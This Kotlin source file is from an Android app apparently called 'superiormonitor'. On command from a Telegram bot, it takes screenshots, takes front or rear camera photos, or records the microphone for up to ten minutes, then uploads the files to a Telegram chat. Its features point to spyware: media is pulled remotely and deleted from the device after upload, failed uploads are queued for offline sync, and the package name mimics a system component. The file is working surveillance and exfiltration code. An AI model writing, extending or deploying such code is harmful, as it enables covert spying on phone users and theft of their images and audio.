package com.system.superiormonitor.monitor

import com.system.superiormonitor.core.LogLevel

import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import com.system.superiormonitor.bot.TelegramApi
import com.system.superiormonitor.core.LogCategory
import com.system.superiormonitor.core.LogManager
import android.app.KeyguardManager
import android.media.AudioAttributes
import android.media.AudioFocusRequest
import android.media.AudioManager
import android.media.MediaRecorder
import android.os.Build
import android.os.PowerManager
import android.telephony.PhoneStateListener
import android.telephony.TelephonyCallback
import android.telephony.TelephonyManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object MediaOperations {

    private val micMutex = Mutex()
    private var isMicRecording = false
    /**
     * Executes an immediate capture and handles UI updates.
     * @param type 0 = Screen, 1 = Front, 2 = Rear
     */
    fun executeOnDemandCapture(context: Context, scope: CoroutineScope, type: Int, chatId: String, messageId: Long, botToken: String) {
        scope.launch(Dispatchers.IO) {
            val tag = when (type) {
                0 -> "[OnDemandScreen]"
                1 -> "[OnDemandFront]"
                else -> "[OnDemandRear]"
            }
            
            // Step 1: Update UI
            TelegramApi.editMessageText(
                token = botToken,
                chatId = chatId,
                messageId = messageId,
                text = "*Processing your request...*",
                replyMarkup = "{\"inline_keyboard\": []}"
            )
            
            LogManager.log(LogCategory.SNAPSHOTS, "$tag Starting immediate capture...")
            
            val cacheDir = context.cacheDir
            val tempFile = when (type) {
                0 -> File(cacheDir, "temp_demand_shot.png")
                1 -> File(cacheDir, "temp_demand_front.jpg")
                else -> File(cacheDir, "temp_demand_rear.jpg")
            }
            
            var isSuccess = true
            var errorOutput = ""
            
            try {
                val (success, errOut) = com.system.superiormonitor.core.CaptureHelper.performCapture(context, type, false, tempFile)
                if (!success) {
                    isSuccess = false
                    errorOutput = errOut
                    
                    if (errOut.contains("skipped/aborted")) {
                        LogManager.log(LogCategory.SNAPSHOTS, "$tag Capture aborted: Screen is locked or off.")
                        TelegramApi.editMessageText(
                            botToken, chatId, messageId,
                            com.system.superiormonitor.bot.BotMessages.Alerts.buildLockedScreenMessage(),
                            replyMarkup = com.system.superiormonitor.bot.BotMarkups.Alerts.buildLockedScreenMarkup()
                        )
                        return@launch
                    }
                }
                
                if (!isSuccess || !tempFile.exists() || tempFile.length() == 0L) {
                    LogManager.log(LogCategory.SNAPSHOTS, "$tag Capture failed. Error: $errorOutput", LogLevel.ERROR)
                    TelegramApi.editMessageText(
                        botToken, chatId, messageId,
                        "❌ *Capture Failed*\n\nReason: $errorOutput",
                        replyMarkup = com.system.superiormonitor.bot.BotMarkups.MediaOps.buildCaptureSuccessMarkup()
                    )
                    return@launch
                }
                
                val bitmap = BitmapFactory.decodeFile(tempFile.absolutePath)
                if (bitmap == null) {
                    tempFile.delete()
                    LogManager.log(LogCategory.SNAPSHOTS, "$tag Decode failed.", LogLevel.ERROR)
                    TelegramApi.editMessageText(botToken, chatId, messageId, "❌ *Capture Failed*\n\nReason: Decode error.", replyMarkup = com.system.superiormonitor.bot.BotMarkups.MediaOps.buildCaptureSuccessMarkup())
                    return@launch
                }
                
                val destFile = File(cacheDir, "demand_upload.jpeg")
                val fos = FileOutputStream(destFile)
                bitmap.compress(Bitmap.CompressFormat.JPEG, if (type == 0) 40 else 85, fos)
                fos.flush()
                fos.close()
                bitmap.recycle()
                tempFile.delete()
                
                val caption = com.system.superiormonitor.bot.BotMessages.MediaOps.buildOnDemandCaptureMessage(type)
                
                // Upload photo
                val uploaded = com.system.superiormonitor.bot.MediaUploader.uploadPhoto(
                    context = context,
                    token = botToken,
                    chatId = chatId,
                    file = destFile,
                    caption = caption,
                    fallbackOfflineSubdir = null
                )
                if (!uploaded) destFile.delete() // Cleanup if failed without offline fallback
                
                if (uploaded) {
                    LogManager.log(LogCategory.SNAPSHOTS, "$tag Capture successfully uploaded.")
                    TelegramApi.editMessageText(
                        token = botToken,
                        chatId = chatId,
                        messageId = messageId,
                        text = "*The shot has been sent successfully*\n\n*Click below button to go back to the SnapShot Engine*",
                        replyMarkup = com.system.superiormonitor.bot.BotMarkups.MediaOps.buildCaptureSuccessMarkup()
                    )
                } else {
                    LogManager.log(LogCategory.SNAPSHOTS, "$tag Upload failed.", LogLevel.ERROR)
                    TelegramApi.editMessageText(
                        botToken, chatId, messageId,
                        "❌ *Capture Failed*\n\nReason: Telegram API Upload Failed.",
                        replyMarkup = com.system.superiormonitor.bot.BotMarkups.MediaOps.buildCaptureSuccessMarkup()
                    )
                }
            } catch (e: Exception) {
                LogManager.log(LogCategory.SNAPSHOTS, "$tag Exception: ${e.message}", LogLevel.ERROR)
                TelegramApi.editMessageText(
                    botToken, chatId, messageId,
                    "❌ *Capture Failed*\n\nReason: Exception occurred.",
                    replyMarkup = com.system.superiormonitor.bot.BotMarkups.MediaOps.buildCaptureSuccessMarkup()
                )
            }
        }
    }

    /**
     * Executes duration-based microphone recording with AudioFocus and Telephony fallback.
     */
    fun executeMicrophoneRecording(context: Context, scope: CoroutineScope, durationMs: Long, chatId: String, messageId: Long, botToken: String) {
        scope.launch(Dispatchers.IO) {
            // Concurrency Check
            if (isMicRecording) {
                TelegramApi.editMessageText(
                    botToken, chatId, messageId,
                    "❌ *Recording failed: Previous request is still in progress.*"
                )
                return@launch
            }

            micMutex.withLock {
                isMicRecording = true
            }

            try {
                val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager

                // Telephony pre-check
                if (telephonyManager.callState != TelephonyManager.CALL_STATE_IDLE) {
                    LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Recording rejected: Phone call in progress.", LogLevel.ERROR)
                    TelegramApi.editMessageText(
                        botToken, chatId, messageId,
                        "❌ *Microphone is already in use or a call is in progress. Please wait for the activity to end.*" // Actually rejecting as requested
                    )
                    micMutex.withLock { isMicRecording = false }
                    return@launch
                }

                LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Waiting for Audio Focus...")
                TelegramApi.editMessageText(
                    botToken, chatId, messageId,
                    "⏳ *Waiting for microphone to be free...*"
                )

                // Wait for Audio Focus
                var focusGained = false
                var attempts = 0
                val focusRequest = withContext(Dispatchers.Main) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        AudioFocusRequest.Builder(AudioManager.AUDIOFOCUS_GAIN_TRANSIENT_EXCLUSIVE)
                            .setAudioAttributes(
                                AudioAttributes.Builder()
                                    .setUsage(AudioAttributes.USAGE_MEDIA)
                                    .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
                                    .build()
                            )
                            .setAcceptsDelayedFocusGain(true)
                            .setOnAudioFocusChangeListener { /* Handled actively during recording */ }
                            .build()
                    } else null
                }

                while (!focusGained && attempts < 12) { // Try for 1 minute (12 * 5s)
                    val result = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && focusRequest != null) {
                        audioManager.requestAudioFocus(focusRequest)
                    } else {
                        @Suppress("DEPRECATION")
                        audioManager.requestAudioFocus(null, AudioManager.STREAM_MUSIC, AudioManager.AUDIOFOCUS_GAIN_TRANSIENT_EXCLUSIVE)
                    }

                    if (result == AudioManager.AUDIOFOCUS_REQUEST_GRANTED) {
                        focusGained = true
                    } else {
                        attempts++
                        delay(5000)
                    }
                }

                if (!focusGained) {
                    LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Failed to acquire Audio Focus after 1 minute.", LogLevel.ERROR)
                    TelegramApi.editMessageText(
                        botToken, chatId, messageId,
                        "❌ *Recording Failed*\n\nReason: Microphone could not be acquired after 1 minute."
                    )
                    micMutex.withLock { isMicRecording = false }
                    return@launch
                }

                LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Starting recording for ${durationMs / 1000}s...")
                TelegramApi.editMessageText(
                    botToken, chatId, messageId,
                    "🎙️ *Starting recording...*"
                )

                // Set up file
                val dir = File(context.getExternalFilesDir(null), "mediaops/microp_temp")
                if (!dir.exists()) dir.mkdirs()
                
                val durationLabel = when(durationMs) {
                    60000L -> "1min"
                    180000L -> "3min"
                    300000L -> "5min"
                    else -> "10min"
                }
                val dateFormat = SimpleDateFormat("hh-mma_dd-MM-yyyy", Locale.getDefault())
                val fileName = "MicroP(${durationLabel})_${dateFormat.format(Date())}.mp3"
                val outputFile = File(dir, fileName)

                var mediaRecorder: MediaRecorder? = null
                var isRecordingActive = false
                
                try {
                    mediaRecorder = withContext(Dispatchers.Main) {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                            MediaRecorder(context)
                        } else {
                            @Suppress("DEPRECATION")
                            MediaRecorder()
                        }
                    }

                    mediaRecorder?.apply {
                        setAudioSource(MediaRecorder.AudioSource.MIC)
                        setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                        setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                        setOutputFile(outputFile.absolutePath)
                        prepare()
                        start()
                        isRecordingActive = true
                    }
                } catch (e: Exception) {
                    LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Failed to start MediaRecorder: ${e.message}", LogLevel.ERROR)
                    TelegramApi.editMessageText(
                        botToken, chatId, messageId,
                        "❌ *Recording Failed*\n\nReason: Failed to start MediaRecorder. ${e.message}"
                    )
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && focusRequest != null) {
                        audioManager.abandonAudioFocusRequest(focusRequest)
                    }
                    micMutex.withLock { isMicRecording = false }
                    return@launch
                }

                var recordingJob: Job? = null
                val focusListener = AudioManager.OnAudioFocusChangeListener { focusChange ->
                    scope.launch(Dispatchers.IO) {
                        when (focusChange) {
                            AudioManager.AUDIOFOCUS_LOSS_TRANSIENT -> {
                                if (isRecordingActive) {
                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                                        LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Recording paused due to Audio Focus loss.")
                                        mediaRecorder?.pause()
                                        TelegramApi.editMessageText(botToken, chatId, messageId, "⏸️ *Recording Paused Due to : Audio Focus Loss*")
                                    } else {
                                        recordingJob?.cancel()
                                    }
                                }
                            }
                            AudioManager.AUDIOFOCUS_GAIN -> {
                                if (isRecordingActive && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                                    LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Recording resumed.")
                                    mediaRecorder?.resume()
                                    TelegramApi.editMessageText(botToken, chatId, messageId, "🎙️ *Starting recording (Resumed)...*")
                                }
                            }
                            AudioManager.AUDIOFOCUS_LOSS -> {
                                LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Recording stopped due to permanent Audio Focus loss.", LogLevel.ERROR)
                                recordingJob?.cancel() // Forcibly stop the recording
                                TelegramApi.editMessageText(botToken, chatId, messageId, "🛑 *Recording Stopped Due To : Permanent Audio Focus Loss*")
                            }
                        }
                    }
                }

                withContext(Dispatchers.Main) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && focusRequest != null) {
                        // Update the listener for real active recording
                    } else {
                        @Suppress("DEPRECATION")
                        audioManager.requestAudioFocus(focusListener, AudioManager.STREAM_MUSIC, AudioManager.AUDIOFOCUS_GAIN_TRANSIENT_EXCLUSIVE)
                    }
                }

                // Telephony Fallback Listener
                var phoneStateListener: PhoneStateListener? = null
                var telephonyCallback: TelephonyCallback? = null
                
                withContext(Dispatchers.Main) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                        telephonyCallback = object : TelephonyCallback(), TelephonyCallback.CallStateListener {
                            override fun onCallStateChanged(state: Int) {
                                if (state != TelephonyManager.CALL_STATE_IDLE) {
                                    scope.launch(Dispatchers.IO) {
                                        LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Recording stopped due to incoming/outgoing call.", LogLevel.ERROR)
                                        TelegramApi.editMessageText(botToken, chatId, messageId, "🛑 *Recording Stopped Due To : Incoming/Outgoing Call*")
                                        recordingJob?.cancel()
                                    }
                                }
                            }
                        }
                        telephonyManager.registerTelephonyCallback(context.mainExecutor, telephonyCallback)
                    } else {
                        phoneStateListener = object : PhoneStateListener() {
                            @Deprecated("Deprecated in Java")
                            override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                                if (state != TelephonyManager.CALL_STATE_IDLE) {
                                    scope.launch(Dispatchers.IO) {
                                        LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Recording stopped due to incoming/outgoing call.", LogLevel.ERROR)
                                        TelegramApi.editMessageText(botToken, chatId, messageId, "🛑 *Recording Stopped Due To : Incoming/Outgoing Call*")
                                        recordingJob?.cancel()
                                    }
                                }
                            }
                        }
                        telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
                    }
                }

                // Wait for the duration
                recordingJob = scope.launch {
                    delay(durationMs)
                }
                recordingJob?.join()

                // Cleanup recording
                try {
                    isRecordingActive = false
                    mediaRecorder?.stop()
                } catch (e: Exception) {
                    LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Error stopping recorder: ${e.message}", LogLevel.ERROR)
                } finally {
                    mediaRecorder?.release()
                }

                try {
                    withContext(Dispatchers.Main) {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && telephonyCallback != null) {
                            telephonyManager.unregisterTelephonyCallback(telephonyCallback)
                        } else if (phoneStateListener != null) {
                            telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE)
                        }
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && focusRequest != null) {
                            audioManager.abandonAudioFocusRequest(focusRequest)
                        } else {
                            @Suppress("DEPRECATION")
                            audioManager.abandonAudioFocus(focusListener)
                        }
                    }
                } catch (e: Exception) {
                    LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Error releasing resources: ${e.message}", LogLevel.ERROR)
                }
                
                // Allow new recordings
                micMutex.withLock { isMicRecording = false }

                TelegramApi.editMessageText(
                    botToken, chatId, messageId,
                    "⏳ *Uploading the file...*"
                )

                // Upload or Offline Sync
                if (!outputFile.exists() || outputFile.length() == 0L) {
                    LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Upload failed: File is empty or corrupt.", LogLevel.ERROR)
                    TelegramApi.editMessageText(
                        botToken, chatId, messageId,
                        "❌ *Audio Recording Failed*\n\nReason: File is empty or corrupt."
                    )
                    return@launch
                }

                val uploaded = com.system.superiormonitor.bot.MediaUploader.uploadDocument(
                    context = context,
                    token = botToken,
                    chatId = chatId,
                    file = outputFile,
                    mimeType = "audio/*",
                    caption = "Microphone Recording",
                    fallbackOfflineSubdir = "mediaops/offline"
                )
                
                if (uploaded) {
                    TelegramApi.editMessageText(
                        botToken, chatId, messageId,
                        "✅ *Recording Successfully Uploaded*\n\nThe recording has been completed. The file was deleted from device and sent to Telegram."
                    )
                } else {
                    TelegramApi.editMessageText(
                        botToken, chatId, messageId,
                        "❌ *Audio Recording Failed*\n\nReason: Network unreachable or API error. File queued for offline sync."
                    )
                }

            } catch (e: Exception) {
                micMutex.withLock { isMicRecording = false }
                LogManager.log(LogCategory.SNAPSHOTS, "[Microphone] Exception: ${e.message}", LogLevel.ERROR)
                TelegramApi.editMessageText(
                    botToken, chatId, messageId,
                    "❌ *Audio Recording Failed*\n\nReason: Exception occurred. ${e.message}"
                )
            }
        }
    }
}
